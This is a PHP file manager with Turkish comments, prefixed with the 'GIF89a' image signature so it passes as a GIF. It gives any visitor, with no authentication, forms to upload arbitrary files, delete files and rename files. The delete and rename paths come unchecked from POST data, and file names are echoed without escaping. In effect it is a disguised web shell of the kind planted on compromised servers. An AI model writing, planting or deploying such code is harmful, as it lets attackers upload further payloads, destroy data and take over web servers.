GIF89a;
<?php
// Dosya düzenleme, silme ve yükleme işlemleri için yetkili kullanıcıların izni gerekir
// Örnek olarak, burada herkesin izni var

// Dizin yolunu belirle (bu dosyanın bulunduğu dizin)
$target_dir = dirname(__FILE__);

// Dizin içeriğini listele
$files = scandir($target_dir);

// Dosyaları görüntüle
echo "<h2>Dosyalar</h2>";
echo "<ul>";
foreach ($files as $file) {
    // "." ve ".." dosyalarını görmezden gel
    if ($file === "." || $file === "..") continue;

    // Dosya adını ve işlem butonlarını görüntüle
    echo "<li>$file ";
    echo "<form method='POST' style='display:inline-block;'>";
    echo "<input type='hidden' name='oldName' value='$file'>";
    echo "<input type='text' name='newName' placeholder='Yeni isim'>";
    echo "<input type='submit' name='rename' value='Yeniden Adlandır'>";
    echo "</form>";
    echo "<form method='POST' style='display:inline-block;'>";
    echo "<input type='hidden' name='deleteFile' value='$file'>";
    echo "<input type='submit' name='delete' value='Sil'>";
    echo "</form>";
    echo "</li>";
}
echo "</ul>";

// Dosya yükleme formu
echo "<h2>Dosya Yükle</h2>";
echo "<form method='POST' enctype='multipart/form-data'>";
echo "<input type='file' name='fileToUpload'>";
echo "<input type='submit' name='upload' value='Yükle'>";
echo "</form>";

// Dosya yükleme işlemi
if (isset($_POST["upload"])) {
    $target_file = $target_dir . "/" . basename($_FILES["fileToUpload"]["name"]);
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "Dosya başarıyla yüklendi.";
        header("Location: ".$_SERVER['PHP_SELF']);
    } else {
        echo "Dosya yüklenirken bir hata oluştu.";
    }
}

// Dosya silme işlemi
if (isset($_POST["delete"])) {
    $filename = $_POST["deleteFile"];
    if (unlink($filename)) {
        echo "Dosya başarıyla silindi.";
        header("Location: ".$_SERVER['PHP_SELF']);
    } else {
        echo "Dosya silinirken bir hata oluştu.";
    }
}

// Dosya yeniden adlandırma işlemi
if (isset($_POST["rename"])) {
    $oldname = $_POST["oldName"];
    $newname = $_POST["newName"];
    if (rename($oldname, $newname)) {
        echo "Dosya başarıyla yeniden adlandırıldı.";
        header("Location: ".$_SERVER['PHP_SELF']);
    } else {
        echo "Dosya adı değiştirilirken bir hata oluştu.";
    }
}
?>
